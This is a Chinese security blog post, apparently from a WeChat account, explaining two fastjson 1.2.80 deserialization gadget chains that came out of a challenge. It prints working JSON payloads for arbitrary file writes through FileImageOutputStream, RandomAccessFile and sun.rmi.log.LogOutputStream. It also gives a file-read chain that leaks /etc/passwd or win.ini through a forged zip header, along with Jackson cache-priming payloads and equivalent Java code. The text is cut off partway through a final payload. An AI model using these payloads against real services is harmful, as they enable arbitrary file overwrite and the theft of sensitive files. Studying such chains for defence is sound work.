---
title: fastjson写文件挑战2——两个fastjson链
url: https://mp.weixin.qq.com/s/H0_UqhyCT7pDa6Szc7rNAQ
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:20:37.965290
---

# fastjson写文件挑战2——两个fastjson链

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Be2IPichjh3NcBTO9hups0l6bwxOHnbApND8WyJnueA3rS7uusffqZibpM7LNBsjsRZT076hAwGPmGPaFSpkkNcY0OSCWbr7dVb83hRWUJK4I/0?wx_fmt=jpeg)

# fastjson写文件挑战2——两个fastjson链

原创

珂字辈
珂字辈

珂技知识分享

![]()

在小说阅读器中沉浸阅读

这个挑战衍生出了两个fastjson链，一个是jdk11\_write的1.2.80版本，一个是jdk11\_read。可以先回顾一下后期的fastjson io相关链。

[fastjson 1.2.80的一些小链](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487463&idx=1&sn=264d9a4bddec78e5d7fd262aa396aceb&scene=21#wechat_redirect)

[springboot环境下的写文件RCE](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487184&idx=1&sn=834e20b19fcffcda9a3357c7621d7bcc&scene=21#wechat_redirect)

一，jdk11\_write\_1.2.80

jdk11\_write链大家都很熟悉了，在1.2.71中，它的关键类被拉黑了

java.io.FileOutputStream

在fastjson 1.2.80的一些小链文章中，我介绍了jdk11\_write链在1.2.80版本，有替代品。

org.apache.tools.ant.util.LazyFileOutputStream

同理，还有logback，不过logback包名很早就被拉黑了。

ch.qos.logback.core.recovery.ResilientFileOutputStream

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3M41VSmh5Tzkmwmuhv7dACZdaLyqESaWRw8xL6NTSnzHU8uumkaPaeqJA0p7x8Mgq81my4Y90sqPw1hCP5f2xHmyHMRPGaRcoc/640?wx_fmt=png&from=appmsg)

事实上这种代替品还不少，本质上我们找一个OutputStream的子类，最多参数的构造函数中有String path或者File file参数就大概率行，在jdk中很容易发现这个类。

javax.imageio.stream.FileImageOutputStream

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NVrcJyWfMGOYQNCLbjgpmPpFeiatpb2nAEJSebhhytdDQwnKHzNAtEiaTMh3udzOW2OZV44WjyuRfDqMXosbOr6jhbCnMKoBYC4/640?wx_fmt=png&from=appmsg)

不管是File还是RandomAccessFile我们都能继续构造，实际环境中它用的是File。

虽然它以OutputStream结尾但并不是OutputStream的子类，而是DataOutput和DataInput的子类。

那么就需要找到一个OutputStream的子类，构造参数中有DataOutput/DataInput，以此来过渡。很容易找到。

com.fasterxml.jackson.core.io.DataOutputAsStream

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3PMQibvTAADLTsVoD0vFT5lrYaO5rXgmcy2dVy0picbBRaP1libiae9GgIYQnnRDmuZlkY1ibdwvpYDOmpYr0BIxX1bh75aoN3SibvQY/640?wx_fmt=png&from=appmsg)

那么标准答案就出来了，一个可以在fastjson 1.2.80+jdk11可以实现任意文件写的链。

```
{    "@type":"java.io.OutputStream",    "@type":"sun.rmi.server.MarshalOutputStream",    "out":    {        "@type":"java.util.zip.InflaterOutputStream",        "out":        {           "@type":"com.fasterxml.jackson.core.io.DataOutputAsStream",           "out":{               "@type":"javax.imageio.stream.FileImageOutputStream",               "f":"1.txt",           }        },        "infl":        {            "input":            {                "array":"eJwL8nUyNDJSyCxWcEEAADwaBX8=",                "limit":20            }        },        "bufLen":1048576    },    "protocolVersion":1}
```

这个链仅依赖jackson，可以覆盖文件，可以写二进制文件，比大多数io链都优秀。缺点是覆盖文件时，如果原文件是16kb，你写入一个10kb的文件去覆盖它，会导致原文件前10kb被覆盖，后6kb不变。也就是覆盖文件只能写入大于或等于这个文件的尺寸。

得到这个链仔细一看，FileImageOutputStream实际上就是封装的RandomAccessFile，而RandomAccessFile也实现了DataOutput。因此可以变形成这样。

```
{    "@type":"java.io.OutputStream",    "@type":"sun.rmi.server.MarshalOutputStream",    "out":    {        "@type":"java.util.zip.InflaterOutputStream",        "out":        {           "@type":"com.fasterxml.jackson.core.io.DataOutputAsStream",           "out":{               "@type":"java.io.RandomAccessFile",               "file":"1.txt",               "mode":"rw",           }        },        "infl":        {            "input":            {                "array":"eJwL8nUyNDJSyCxWcMYCAHizB88=",                "limit":20            }        },        "bufLen":1048576    },    "protocolVersion":1}
```

此时可以意识到，RandomAccessFile才是核心，它是直接使用native比较底层的类。只需要找封装了RandomAccessFile的OutputStream子类就行，jdk中正好有一个。

PS：RandomAccessFile在jdk11\_read链中也发挥了关键作用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OibpNElnAgLbnSmfu5x7RFpMz9bMDwib3zXB5ymmhwZv307LF5zVETuE224QZcxpyWwWAULLmiaibVNVom9mxK1Vib5TFMRWuskSUA/640?wx_fmt=png&from=appmsg)

sun.rmi.log.LogOutputStream

```
{    "@type":"java.io.OutputStream",    "@type":"sun.rmi.server.MarshalOutputStream",    "out":    {        "@type":"java.util.zip.InflaterOutputStream",        "out":        {           "@type":"sun.rmi.log.LogOutputStream",           "raf":{               "@type":"java.io.RandomAccessFile",               "file":"1.txt",               "mode":"rw",           }        },        "infl":        {            "input":            {                "array":"eJwL8nUyNDJSyCxWcMQCAHcPB6c=",                "limit":20            }        },        "bufLen":1048576    },    "protocolVersion":1}
```

除此之外，第三方组件中这样的类也可能找得出来，就留给大家探索了。

二，jdk11\_read

该链由jcw发现，因为靶场将jdk路径随机化了，jcw通过jdk11\_read链读取/proc/self/cmdline获取了jdk路径，将题目难度大大降低了，起到了举足轻重的作用。

而该链脑洞也十分巨大，不得不分享出来给大家品鉴。原poc如下。

```
{    "a": "{\"a\":{\"@type\":\"java.io.DataInput\",\"@type\":\"java.io.RandomAccessFile\",\"name\":\"/etc/passwd\",\"file\":\"/etc/passwd\",\"mode\":\"r\"},\"b\":{\"@type\":\"java.io.InputStream\",\"@type\":\"sun.nio.ch.ChannelInputStream\",\"ch\":{\"$ref\":\"$.a.channel\"}},\"c\":{\"@type\":\"java.io.InputStream\",\"@type\":\"com.fasterxml.jackson.core.io.MergedStream\",\"in\":{\"$ref\":\"$.b\"},\"buf\":[80,75,3,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0],\"start\":0,\"end\":30},\"d\":{\"@type\":\"java.io.InputStream\",\"@type\":\"java.util.zip.ZipInputStream\",\"in\":{\"$ref\":\"$.c\"},\"charset\":\"ISO-8859-1\"}}",    "b": {        "$ref": "$.a.d.nextEntry.name"    }}
```

当然java.io.DataInput和java.io.InputStream需要先利用jackson缓存

```
{    "a": "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.fasterxml.jackson.core.exc.InputCoercionException\",\"p\":{}}",    "b": {        "$ref": "$.a.a"    },    "c": "{\"@type\":\"com.fasterxml.jackson.core.JsonParser\",\"@type\":\"com.fasterxml.jackson.core.json.UTF8DataInputJsonParser\",\"inputData\":{}}",    "d": {        "$ref": "$.c.c"    },    "e": "{\"@type\":\"com.fasterxml.jackson.core.JsonParser\",\"@type\":\"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",\"in\":{}}",    "f": {        "$ref": "$.e.e"    }}
```

效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3ON8B2V8p1H98vZRDYHB6vOmfoYBjT4WNcOiabiaZquKHUX5fI9gaMWlVpPTYtiaGMCwsOXKElvndDicwNuNQgFc6hAglXwLtlKsNw/640?wx_fmt=png&from=appmsg)

为什么可以读出文件的片段呢？首先当然是因为靶场将反序列化后的JSONObject对象打印了出来，而b键对应的$.a.d.nextEntry.name，实际上就等于需要打印ZipInputStream.getNextEntry().getName()

我们用ZipInputStream处理一个正常的zip文件看它是什么。

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MsurUKzLxESO220XiaHDicDZBZtVG3MJOEE87J3OexVeBuJuMRwLtT2adv0PuL1rjUzt5un7mPibO6ibOwHtgQiaOTr4RO0f6AySdk/640?wx_fmt=png&from=appmsg)

没错，就是压缩后的文件名，而这个文件名是由什么决定的呢？

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Ohu1oyq17hOG4611wWRIojOzegulBWPbLOibiazUAoEmRXGXButLxRial1SUTWJx2lXhmgDQV9elhPqFHxzwZwIyd9DT5YU0II7g/640?wx_fmt=png&from=appmsg)

正是zip文件格式中的一个个结构体中对应的frFileName属性，因此我们只要伪造结构体的前面，将所需要读取的文件内容拼接在frFileName位置上，调用ZipInputStream.getNextEntry().getName()时就刚好能够打印出文件内容。

正好MergedStream可以拼接两个Stream，正常文件流需要FileInputStream，但在1.2.71被禁用，所以拿ChannelInputStream代替。

将poc分解成java代码如下。

```
RandomAccessFile ra = new RandomAccessFile("C:\\windows\\win.ini", "r");ChannelInputStream is = new ChannelInputStream(ra.getChannel());byte[] zipbs = {80,75,3,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0};MergedStream ms = new MergedStream(null, is, zipbs, 0, zipbs.length);ZipInputStream zis = new ZipInputStream(ms);System.out.println(zis.getNextEntry().getName());
```

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Mcib7Cc8AJCRT134NxManibPgpzMZMtyLgEjlMVib58WZ8K8xdXPQC7mRhpYKwIJPSJkTYhIEhgAeY7Gw8T5USM5icSA78IcH2t3c/640?wx_fmt=png&from=appmsg)

实在是太精巧了！但这个fastjson poc为什么要写成json套json字符串的形式呢？如果我写成这样能不能用？

```
{  "a": {    "@type": "java.io.DataInput",    "@type": "java.io.RandomAccessFile",    "file": "C://windows/win.ini",    "mode": "r"  },  "b": {    "@type": "java.io.InputStream",    "@type": "sun.nio.ch.ChannelInputStream",    "ch": {      "$ref": "$.a.channel"    }  },  "c": {    "@type": "java.io.InputStream",    "@type": "com.fasterxml.jackson.core.io.MergedStream",    "in": {      "$ref": "$.b"    },    "buf": [80,75,3,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0],    "start": 0,    "end": 30  },  "d": {    "@type": "java.io.InputStream",    "@type": "java.util.zip.ZipInputStream",    "in": {      "...